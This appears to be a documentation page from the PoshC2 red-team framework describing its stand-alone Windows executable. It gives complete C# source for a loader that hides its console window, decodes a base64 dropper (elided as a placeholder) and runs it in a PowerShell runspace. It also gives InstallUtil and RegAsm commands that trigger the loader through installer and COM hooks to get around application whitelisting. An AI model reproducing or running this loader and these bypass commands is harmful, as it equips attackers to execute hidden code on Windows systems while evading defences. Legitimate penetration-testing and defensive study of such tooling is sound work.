###########################
  Stand Alone Executable
###########################
Mitre ATT&CK - `Powershell <https://attack.mitre.org/wiki/Technique/T1086>`_

Mitre ATT&CK - `InstallUtil <https://attack.mitre.org/wiki/Technique/T1118>`_

Mitre ATT&CK - `RegAsm <https://attack.mitre.org/wiki/Technique/T1121>`_

The following C# code creates the stand alone executable used in PoshC2. The code essentially creates a new Powershell Runspace using the System.Management.Automation.dll (v2.0.50727) that is supplied with the project. This executable is not signed.

This can be called directly::

	.\Posh.exe

Or called using InstallUtil::

 	C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\Posh.exe

Or called using RegAsm::

	C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U C:\Temp\Posh.exe

C# Code:: 

	using System;
	using System.Text;
	using System.Diagnostics;
	using System.Reflection;
	using System.Configuration.Install;
	using System.Runtime.InteropServices;
	using System.Collections.ObjectModel;
	using System.Management.Automation;
	using System.Management.Automation.Runspaces;
	using System.EnterpriseServices;

	public class Program
	    {
	        [DllImport("kernel32.dll")]
	        static extern IntPtr GetConsoleWindow();
	        [DllImport("user32.dll")]
	        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	        public const int SW_HIDE = 0;
	        public const int SW_SHOW = 5;
	        public static string p = "<base64 encoded core dropper>";
	        public Program() {
	            try
	            {
	                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
	                InvokeAutomation(tt);
	            }
	            catch
	            {
	                Main();
	            }
	        }
	        public static string InvokeAutomation(string cmd)
	        {
	            Runspace newrunspace = RunspaceFactory.CreateRunspace();
	            newrunspace.Open();
	            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
	            Pipeline pipeline = newrunspace.CreatePipeline();

	            pipeline.Commands.AddScript(cmd);
	            Collection<PSObject> results = pipeline.Invoke();
	            newrunspace.Close();

	            StringBuilder stringBuilder = new StringBuilder();
	            foreach (PSObject obj in results)
	            {
	                stringBuilder.Append(obj);
	            }
	            return stringBuilder.ToString().Trim();
	        }
	        public static void Main()
	        {
	            var handle = GetConsoleWindow();
	            ShowWindow(handle, SW_HIDE);
	            try
	            {
	                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
	                InvokeAutomation(tt);
	            }
	            catch
	            {
	                Main();
	            }
	        }
	        
	}

	public class Bypass : ServicedComponent
	{
		[ComRegisterFunction]
		public static void RegisterClass ( string key )
		{
			Program.Main(); 
		}
		
		[ComUnregisterFunction]
		public static void UnRegisterClass ( string key )
		{
			Program.Main(); 
		}
	}
	    
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
	    public override void Uninstall(System.Collections.IDictionary savedState)
	    {
	        Program.Main();       
	    }
	    public static string InvokeAutomation(string cmd)
	    {
	        Runspace newrunspace = RunspaceFactory.CreateRunspace();
	        newrunspace.Open();
	        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
	        Pipeline pipeline = newrunspace.CreatePipeline();

	        pipeline.Commands.AddScript(cmd);
	        Collection<PSObject> results = pipeline.Invoke();
	        newrunspace.Close();

	        StringBuilder stringBuilder = new StringBuilder();
	        foreach (PSObject obj in results)
	        {
	            stringBuilder.Append(obj);
	        }
	        return stringBuilder.ToString().Trim();
	    }
	}